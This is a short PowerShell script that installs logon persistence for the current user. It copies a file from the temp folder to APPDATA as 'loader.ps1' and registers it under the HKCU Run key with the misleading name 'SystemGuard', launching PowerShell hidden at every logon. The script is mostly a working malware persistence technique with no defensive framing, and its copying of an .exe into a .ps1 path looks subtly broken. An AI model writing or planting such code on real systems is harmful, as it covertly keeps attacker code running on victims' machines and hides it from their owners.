[CmdletBinding()]
param(
    [string]$RunKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    [string]$RegistryValue = "SystemGuard",
    [string]$PersistencePath = "$env:APPDATA\loader.ps1"
)
$ErrorActionPreference = "Stop"

try {
    Write-Verbose "Installing per-user persistence"
    if (-not (Test-Path -Path $PersistencePath)) {
        Copy-Item -Path "$env:TEMP\updater.exe" -Destination $PersistencePath -Force
    }
    New-ItemProperty -Path $RunKeyPath -Name $RegistryValue -Value ('powershell.exe -NoP -WindowStyle Hidden -File "' + $PersistencePath + '"') -PropertyType String -Force
    $TransferResult = Get-ItemProperty -Path $RunKeyPath -Name $RegistryValue
    Write-Verbose ("Registered value: " + $TransferResult.$RegistryValue)
}
catch {
    Write-Warning "Run-key installation failed: $($_.Exception.Message)"
}

Write-Verbose "stage marker 38 reached"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
